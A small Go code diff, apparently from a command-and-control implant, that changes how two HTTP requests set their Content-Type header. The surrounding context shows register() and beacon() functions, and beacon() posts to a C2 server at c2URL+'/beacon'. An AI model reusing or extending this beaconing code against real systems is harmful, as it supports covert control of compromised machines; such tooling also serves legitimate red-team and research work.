@@ -60,7 +60,7 @@ func register() error {
 	if err != nil {
 		return fmt.Errorf("Error building POST request: %v", err)
 	}
-	request.Header.Add("Content-Type", "application/json")
+	request.Header.Set("Content-Type", "application/json")
 
 	// get HTTP response from server
 	response, err := client.Do(request)
@@ -113,7 +113,7 @@ func beacon() error {
 	}
 	body := bytes.NewReader(data)
 	request, err := http.NewRequest("POST", c2URL+"/beacon", body)
-	request.Header.Add("Content-Type", "application/json")
+	request.Header.Set("Content-Type", "application/json")
 
 	// grab server response
 	response, err := client.Do(request)
